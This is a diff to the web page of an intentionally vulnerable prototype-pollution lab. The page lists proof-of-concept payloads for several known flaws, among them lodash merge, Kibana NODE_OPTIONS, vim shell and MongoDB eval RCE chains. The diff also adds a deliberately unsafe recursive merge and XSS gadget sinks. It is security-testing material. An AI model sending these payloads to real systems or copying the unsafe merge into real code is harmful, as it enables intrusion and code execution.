@@ -1,10 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title><%= title %></title>
-    <script src="https://code.jquery.com/jquery-3.4.1.js"></script>
+    <title>
+        <%= title %>
+    </title>
+    <script src="https://code.jquery.com/jquery-3.3.1.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qs/6.11.0/qs.min.js"></script>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -14,6 +18,7 @@
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #fff;
         }
+
         .container {
             background: rgba(255, 255, 255, 0.1);
             backdrop-filter: blur(10px);
@@ -21,11 +26,13 @@
             padding: 30px;
             box-shadow: 0 8px 32px 0 rgba(31, 38, 135, 0.37);
         }
+
         h1 {
             text-align: center;
             font-size: 2.5em;
             margin-bottom: 10px;
         }
+
         .warning {
             background: rgba(255, 59, 48, 0.2);
             border-left: 4px solid #ff3b30;
@@ -33,12 +40,14 @@
             margin: 20px 0;
             border-radius: 5px;
         }
+
         .endpoint-list {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
             gap: 15px;
             margin-top: 20px;
         }
+
         .endpoint {
             background: rgba(255, 255, 255, 0.15);
             padding: 15px;
@@ -46,10 +55,12 @@
             transition: transform 0.2s;
             position: relative;
         }
+
         .endpoint:hover {
             transform: translateY(-5px);
             background: rgba(255, 255, 255, 0.25);
         }
+
         .tier-badge {
             display: inline-block;
             padding: 3px 10px;
@@ -58,13 +69,35 @@
             font-weight: bold;
             margin-right: 5px;
         }
-        .tier-0 { background: #ff3b30; }
-        .tier-1 { background: #ff9500; }
-        .tier-2 { background: #ffcc00; }
-        .tier-3 { background: #34c759; }
-        .tier-4 { background: #007aff; }
-        .tier-5 { background: #5856d6; }
-        .tier-6 { background: #af52de; }
+
+        .tier-0 {
+            background: #ff3b30;
+        }
+
+        .tier-1 {
+            background: #ff9500;
+        }
+
+        .tier-2 {
+            background: #ffcc00;
+        }
+
+        .tier-3 {
+            background: #34c759;
+        }
+
+        .tier-4 {
+            background: #007aff;
+        }
+
+        .tier-5 {
+            background: #5856d6;
+        }
+
+        .tier-6 {
+            background: #af52de;
+        }
+
         code {
             display: block;
             background: rgba(0, 0, 0, 0.3);
@@ -76,6 +109,7 @@
             word-break: break-all;
             font-size: 0.9em;
         }
+
         button.test-btn {
             background: #28a745;
             color: white;
@@ -86,13 +120,15 @@
             font-size: 0.9em;
             margin-top: 5px;
         }
+
         button.test-btn:hover {
             background: #218838;
         }
+
         .result-box {
             display: none;
             margin-top: 10px;
-            background: rgba(0,0,0,0.5);
+            background: rgba(0, 0, 0, 0.5);
             padding: 5px;
             border-radius: 3px;
             font-size: 0.8em;
@@ -100,13 +136,15 @@
         }
     </style>
 </head>
+
 <body>
     <div class="container">
         <h1>🔓 PPMAP Vulnerable Lab</h1>
         <p style="text-align: center; font-size: 1.2em;">Comprehensive Prototype Pollution Testing Environment</p>
-        
+
         <div class="warning">
-            <strong>⚠️ WARNING:</strong> This application is INTENTIONALLY VULNERABLE for security testing purposes only.
+            <strong>⚠️ WARNING:</strong> This application is INTENTIONALLY VULNERABLE for security testing purposes
+            only.
             <br>DO NOT deploy to production or expose to public internet!
         </div>
 
@@ -120,13 +158,14 @@
 
         <h2>🎯 Available Endpoints</h2>
         <div class="endpoint-list">
-            
+
             <div class="endpoint">
                 <span class="tier-badge tier-0">Tier 0</span>
                 <h3>POST /api/merge</h3>
                 <p>Lodash _.merge (CVE-2020-8203)</p>
                 <code>{"__proto__":{"isAdmin":true}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/merge", "POST", {"__proto__":{"isAdmin":true}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/merge", "POST", {"__proto__":{"isAdmin":true}})'>Run PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -135,7 +174,8 @@
                 <h3>POST /api/deep-merge</h3>
                 <p>deep-merge RCE (CVE-2024-38986)</p>
                 <code>{"__proto__":{"shell":"vim"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/deep-merge", "POST", {"__proto__":{"shell":"vim"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/deep-merge", "POST", {"__proto__":{"shell":"vim"}})'>Run PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -144,7 +184,9 @@
                 <h3>POST /api/child-process</h3>
                 <p>child_process RCE</p>
                 <code>{"__proto__":{"shell":"vim","input":":!id\\n"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/child-process", "POST", {"__proto__":{"shell":"vim","input":":!id\\n"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/child-process", "POST", {"__proto__":{"shell":"vim","input":":!id\\n"}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -153,7 +195,9 @@
                 <h3>POST /api/telemetry</h3>
                 <p>Kibana Telemetry ($10k bounty)</p>
                 <code>{"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/telemetry", "POST", {"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/telemetry", "POST", {"path":"__proto__.env.NODE_OPTIONS","value":"--require /proc/self/environ"})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -162,7 +206,9 @@
                 <h3>POST /api/cors</h3>
                 <p>CORS Header Pollution</p>
                 <code>{"__proto__":{"exposedHeaders":"X-Polluted"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/cors", "POST", {"__proto__":{"exposedHeaders":"X-Polluted"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/cors", "POST", {"__proto__":{"exposedHeaders":"X-Polluted"}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -171,7 +217,9 @@
                 <h3>POST /api/constructor</h3>
                 <p>Constructor-based Bypass</p>
                 <code>{"constructor":{"prototype":{"polluted":true}}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/constructor", "POST", {"constructor":{"prototype":{"polluted":true}}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/constructor", "POST", {"constructor":{"prototype":{"polluted":true}}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -180,7 +228,9 @@
                 <h3>POST /api/sanitize</h3>
                 <p>Sanitization Bypass</p>
                 <code>{"__pro__proto__to__":{"bypass":true}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/sanitize", "POST", {"__pro__proto__to__":{"bypass":true}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/sanitize", "POST", {"__pro__proto__to__":{"bypass":true}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -189,7 +239,9 @@
                 <h3>POST /api/descriptor</h3>
                 <p>Descriptor Pollution</p>
                 <code>{"__proto__":{"value":"polluted"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/descriptor", "POST", {"__proto__":{"value":"polluted"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/descriptor", "POST", {"__proto__":{"value":"polluted"}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -198,7 +250,8 @@
                 <h3>POST /api/gadgets</h3>
                 <p>Blind Gadget Fuzzing</p>
                 <code>{"__proto__":{"shell":"test"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/gadgets", "POST", {"__proto__":{"shell":"test"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/gadgets", "POST", {"__proto__":{"shell":"test"}})'>Run PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -207,7 +260,8 @@
                 <h3>GET /analytics</h3>
                 <p>Google Analytics Gadget</p>
                 <code>?__proto__[hitCallback]=alert(1)</code>
-                <button class="test-btn" onclick='window.open("/analytics?__proto__[hitCallback]=alert(1)", "_blank")'>Open Link</button>
+                <button class="test-btn"
+                    onclick='window.open("/analytics?__proto__[hitCallback]=alert(1)", "_blank")'>Open Link</button>
                 <div class="result-box"></div>
             </div>
 
@@ -216,7 +270,8 @@
                 <h3>GET /storage-test</h3>
                 <p>Storage API Pollution</p>
                 <code>?__proto__[testItem]=polluted</code>
-                <button class="test-btn" onclick='window.open("/storage-test?__proto__[testItem]=polluted", "_blank")'>Open Link</button>
+                <button class="test-btn"
+                    onclick='window.open("/storage-test?__proto__[testItem]=polluted", "_blank")'>Open Link</button>
                 <div class="result-box"></div>
             </div>
 
@@ -225,16 +280,20 @@
                 <h3>POST /api/blitzjs</h3>
                 <p>Blitz.js RCE Chain</p>
                 <code>{"json":{"__proto__":{"shell":"vim"}}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/blitzjs", "POST", {"json":{"__proto__":{"shell":"vim"}}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/blitzjs", "POST", {"json":{"__proto__":{"shell":"vim"}}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
-            
+
             <div class="endpoint">
                 <span class="tier-badge tier-6">Phase 10</span>
                 <h3>POST /api/v1/bson-eval</h3>
                 <p>MongoDB evalFunctions RCE</p>
                 <code>{"__proto__":{"evalFunctions":true}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/v1/bson-eval", "POST", {"__proto__":{"evalFunctions":true,"$where":"id"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/v1/bson-eval", "POST", {"__proto__":{"evalFunctions":true,"$where":"id"}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -243,7 +302,9 @@
                 <h3>POST /api/v1/eta-render</h3>
                 <p>ETA Template Engine RCE</p>
                 <code>{"__proto__":{"varName":"x=1"}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/v1/eta-render", "POST", {"__proto__":{"varName":"x=1"}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/v1/eta-render", "POST", {"__proto__":{"varName":"x=1"}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -252,7 +313,9 @@
                 <h3>POST /api/v1/typeorm-auth</h3>
                 <p>TypeORM Auth Bypass</p>
                 <code>{"__proto__":{"where":{"1":"1"}}}</code>
-                <button class="test-btn" onclick='runTest(this, "/api/v1/typeorm-auth", "POST", {"__proto__":{"where":{"1":"1"}}})'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/v1/typeorm-auth", "POST", {"__proto__":{"where":{"1":"1"}}})'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
 
@@ -261,7 +324,9 @@
                 <h3>POST /api/v1/xml2js</h3>
                 <p>xml2js Prototype Pollution</p>
                 <code>&lt;__proto__&gt;&lt;polluted&gt;true&lt;/polluted&gt;&lt;/__proto__&gt;</code>
-                <button class="test-btn" onclick='runTest(this, "/api/v1/xml2js", "POST", "<__proto__><polluted>true</polluted></__proto__>")'>Run PoC</button>
+                <button class="test-btn"
+                    onclick='runTest(this, "/api/v1/xml2js", "POST", "<__proto__><polluted>true</polluted></__proto__>")'>Run
+                    PoC</button>
                 <div class="result-box"></div>
             </div>
         </div>
@@ -287,7 +352,7 @@ python3 ppmap.py --scan http://localhost:3000 --browser chrome
             const resultBox = btn.nextElementSibling;
             resultBox.style.display = 'block';
             resultBox.innerText = 'Sending payload...';
-            
+
             try {
                 const options = {
                     method: method,
@@ -301,12 +366,12 @@ python3 ppmap.py --scan http://localhost:3000 --browser chrome
                         options.body = JSON.stringify(body);
                     }
                 }
-                
+
                 const response = await fetch(url, options);
                 const data = await response.json();
-                
+
                 resultBox.innerText = 'Status: ' + response.status + '\n' + JSON.stringify(data, null, 2).substring(0, 100) + '...';
-                
+
                 // Visual feedback of pollution
                 if (data.prototype && data.prototype.isAdmin) {
                     resultBox.innerHTML += '<br><strong style="color:red">POLLUTION SUCCESSFUL!</strong>';
@@ -316,29 +381,73 @@ python3 ppmap.py --scan http://localhost:3000 --browser chrome
             }
         }
 
-        // jQuery PP vulnerability demonstration
-        $(document).ready(function() {
-            // Vulnerable to prototype pollution via query params
-            const params = new URLSearchParams(window.location.search);
-            params.forEach((value, key) => {
-                if (key.includes('__proto__') || key.includes('constructor')) {
-                    console.warn('Prototype pollution attempt detected:', key, value);
+        // Truly Vulnerable Recursive Merge function for Lab Testing
+        function vulnerableMerge(target, source) {
+            for (let key in source) {
+                if (typeof source[key] === 'object' && source[key] !== null) {
+                    if (!target[key]) target[key] = {};
+                    vulnerableMerge(target[key], source[key]);
+                } else {
+                    target[key] = source[key];
                 }
-            });
+            }
+            return target;
+        }
 
-            // Simulate jQuery extend vulnerability
-            $.extend(true, {}, <%= JSON.stringify(query) %>);
-            
-            // Phase 10: Mock Akamai BoT script simulating Client-Side Gadget
+        $(document).ready(function () {
+            // 1. Detect and Parse Payload from URL
+            const queryString = window.location.search;
+            if (queryString) {
+                console.log("[LAB] Parsing query for Prototype Pollution...");
+
+                // Use Qs to get the raw object structure
+                const parsedPayload = Qs.parse(queryString, { ignoreQueryPrefix: true, allowPrototypes: true });
+
+                // 2. Trigger the Vulnerability through the CUSTOM merge function
+                // This is guaranteed to pollute Object.prototype because it doesn't have jQuery/Node safeguards
+                try {
+                    vulnerableMerge({}, parsedPayload);
+                    console.log("[LAB] Vulnerable merge executed on payload:", parsedPayload);
+                } catch (e) {
+                    console.error("[LAB] Merge error:", e);
+                }
+            }
+
+            // 3. Elastic/Kibana XSS Simulator (HackerOne #998398)
+            // This represents a 'gadget' that exists in a framework (React/Angular)
+            // which blindly maps object properties to DOM attributes.
+            setInterval(() => {
+                const testObj = {};
+                if (testObj.onclick && !document.getElementById("xss-trigger-btn")) {
+                    console.warn("🚨 [GADGET] Prototype Pollution Leakage Detected! (Object.prototype.onclick is present)");
+
+                    const btn = document.createElement("button");
+                    btn.id = "xss-trigger-btn";
+                    btn.innerText = "🚨 Elastic XSS Payload Trigger (Click Me!)";
+                    btn.style = "display: block; background: #ff3b30; color: white; padding: 20px; font-weight: bold; border-radius: 12px; margin: 30px auto; width: 90%; border: 4px solid #fff; cursor: pointer; font-size: 1.4em; box-shadow: 0 0 30px rgba(255, 59, 48, 0.8); animation: pulse 1s infinite alternate;";
+
+                    // The gadget uses the polluted property to set a DOM handler
+                    btn.setAttribute('onclick', testObj.onclick);
+
+                    // Add animation
+                    const style = document.createElement('style');
+                    style.innerHTML = '@keyframes pulse { from { transform: scale(1); } to { transform: scale(1.02); } }';
+                    document.head.appendChild(style);
+
+                    document.querySelector(".container").appendChild(btn);
+                }
+            }, 1000);
+
+            // Phase 10: Mock Akamai BoT script simulation
             setTimeout(() => {
                 if (Object.prototype.ak_bmsc) {
-                    console.error("Akamai BoT XSS Gadget Triggered!", Object.prototype.ak_bmsc);
                     const container = document.createElement("div");
                     container.innerHTML = Object.prototype.ak_bmsc;
                     document.body.appendChild(container);
                 }
-            }, 1000);
+            }, 500);
         });
     </script>
 </body>
+
 </html>
